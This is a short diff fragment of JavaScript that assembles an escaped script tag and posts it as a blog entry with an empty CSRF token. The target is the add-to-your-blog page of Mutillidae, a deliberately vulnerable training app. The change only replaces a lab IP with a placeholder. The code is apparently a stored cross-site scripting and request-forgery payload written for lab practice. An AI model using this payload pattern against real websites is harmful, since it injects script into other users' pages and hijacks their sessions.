@@ -8,7 +8,7 @@ var scripttag2 ="</scr".concat("ipt>");
 scripttext = escape(scripttext);
 scripttext = scripttag1.concat(scripttext);
 scripttext = scripttext.concat(scripttag2);
-var url = "http://192.168.143.132/mutillidae/index.php?page=add-to-your-blog.php";
+var url = "<IP_ADDR>/mutillidae/index.php?page=add-to-your-blog.php";
 var params = "blog_entry=";
 params = params.concat(scripttext);
 params = params.concat("&csrf-token=&add-to-your-blog-php-submit-button=Save+Blog+Entry");
